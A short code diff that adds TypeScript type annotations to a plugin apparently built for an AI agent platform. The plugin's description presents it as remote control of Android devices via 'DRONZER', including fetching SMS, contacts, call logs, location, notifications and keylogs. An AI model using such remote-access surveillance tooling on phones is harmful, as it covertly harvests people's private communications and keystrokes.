@@ -17,7 +17,7 @@ export default definePluginEntry({
   name: "Dronzer Ultimate",
   description: "Remote control Android devices via DRONZER. Use dronzer_* tools when the user asks to fetch devices, SMS, contacts, call logs, location, notifications, or keylogs from a phone.",
 
-  register(api) {
+  register(api: any) {
     const pluginConfig = api.runtime.config.current() as any;
     // Nuclear Option: Deep clone to strip all Proxies and hidden Symbols from OpenClaw's config
     const cleanConfig = JSON.parse(JSON.stringify(pluginConfig));
@@ -432,7 +432,7 @@ export default definePluginEntry({
         },
         required: ["deviceId"]
       },
-      async execute(_id, params) {
+      async execute(_id: string, params: any) {
         const args = params as { deviceId: string };
         try {
           const result = await sendAndCollect(`select ${args.deviceId}`);
